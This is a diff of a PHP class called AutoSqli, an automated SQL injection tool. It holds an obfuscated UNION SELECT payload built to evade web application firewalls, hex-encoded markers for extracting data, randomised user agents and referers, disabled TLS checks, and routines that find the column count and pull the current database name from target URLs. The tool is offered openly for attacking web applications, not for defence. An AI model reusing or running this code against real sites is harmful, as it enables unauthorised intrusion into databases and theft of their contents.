@@ -1,25 +1,23 @@
 <?php
 
-require "vendor/autoload.php";
-require "uagent.php";
-require "referer.php";
+require "autoload.php";
 error_reporting(0);
 
 class AutoSqli
 {
 
-    protected $url                 = "";
-    protected $url_injection       = "";
-    protected $current_database    = "";
-    protected $databases           = [];
-    protected $tabels              = [];
-    protected $columns             = [];
-    protected $startSQLi           = "0x3C73716C692D68656C7065723E"; # <sqli-helper>
-    protected $endSQLi             = "0x3C2F73716C692D68656C7065723E"; # </sqli-helper>
-    protected $UnionPayload        = "/**666**/%41%4e%44/**666**/0/**666**//*!13337%55%6e%49o%4E*//**666**//*!13337s%45l%45c%54*//**666**/";
-    protected $number_colum        = 0;
-    protected $header              = [];
-    protected $options_curl        = [];
+    public $url                 = "";
+    public $url_injection       = "";
+    public $current_database    = "";
+    public $databases           = [];
+    public $tabels              = [];
+    public $columns             = [];
+    public $startSQLi           = "0x3C73716C692D68656C7065723E"; # <sqli-helper>
+    public $endSQLi             = "0x3C2F73716C692D68656C7065723E"; # </sqli-helper>
+    public $UnionPayload        = "/**666**/%41%4e%44/**666**/0/**666**//*!13337%55%6e%49o%4E*//**666**//*!13337s%45l%45c%54*//**666**/";
+    public $number_colum        = 0;
+    public $header              = [];
+    public $options_curl        = [];
 
     public function __construct()
     {
@@ -33,21 +31,28 @@ class AutoSqli
             'Accept-Language: id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4',
             'Cache-Control: no-cache',
             'Pragma: no-cache',
-
         );
 
         // set URL and other appropriate options
         $this->options_curl  = array(
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => false,
-            CURLOPT_TIMEOUT => 10,
+            CURLOPT_RETURNTRANSFER => TRUE,
+            CURLOPT_SSL_VERIFYPEER => FALSE,
+            CURLOPT_SSL_VERIFYHOST => FALSE,
+            CURLOPT_TIMEOUT => 5,
+            CURLOPT_CONNECTTIMEOUT => 5,
             CURLOPT_ENCODING => 'gzip',
+            // CURLOPT_PROXY => Proxy::random(),
+            // CURLOPT_PROXYPORT => $proxy->port,
             CURLOPT_USERAGENT => UAgent::random(),
             CURLOPT_REFERER => Referer::random(),
             CURLOPT_HTTPHEADER => $this->header,
         );
     }
+
+    // public function grabproxy()
+    // {
+    //     ProxyGrabber::getproxy();
+    // }
 
     public function setUrl($url)
     {
@@ -69,7 +74,6 @@ class AutoSqli
     {
         $mc = JMathai\PhpMultiCurl\MultiCurl::getInstance();
         $tampung_semua = array();
-        // $pisah = explode("=", $this->url);
         $this->url_injection = "{$this->url}-" . rand(10, 100);
 
         $tampung_angka = "";
@@ -105,6 +109,10 @@ class AutoSqli
 
     public function getnumbercolumn()
     {
+        if ($this->number_colum == 200) {
+            return false;
+        }
+
         $this->number_colum = (int) ($this->number_colum / 2) + 1;
         return  $this->number_colum;
     }
@@ -135,6 +143,7 @@ class AutoSqli
 
             if ($match[1][0] != "") {
                 $this->current_database = $match[1][0];
+                break;
             }
         }
     }
